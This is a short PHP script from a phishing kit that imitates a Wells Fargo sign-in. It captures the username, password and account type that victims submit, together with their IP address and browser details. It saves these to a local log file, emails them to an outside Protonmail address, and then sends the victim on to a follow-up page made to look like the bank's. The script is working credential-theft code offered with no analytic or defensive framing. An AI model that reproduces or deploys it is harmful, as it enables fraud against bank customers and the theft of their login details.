<?php
$ip = getenv("REMOTE_ADDR");
$user_agent = $_SERVER['HTTP_USER_AGENT'];
$hostname = gethostbyaddr($ip);
$message = "----------WELLS FARGO-----------\n";
$message .= "Useri : " . $_POST['16t1'] . "\n";
$message .= "Paword : " . $_POST['su17'] . "\n";
$message .= "Account Type : " . $_POST['cz211'] . "\n";
$message .= "Client IP : " . $ip . "\n";
$message .= "---------GOD LOVE---------------\n";
$message .= "Browser Details : " . $user_agent . "\n";
$to = "100fareedah@protonmail.com";
$subj = " WelsFargo ||" . $ip . "\n";
$from = "From: WFargo  <codewizard@approject.com>";
$fp = fopen('virus.txt', 'a');
fwrite($fp, $message);
fclose($fp);
mail($to, $subj, $message, $from);
Header("Location: info.html?signinpage&update=&cookiecheck=yes&destination=nba/signin&action");
?>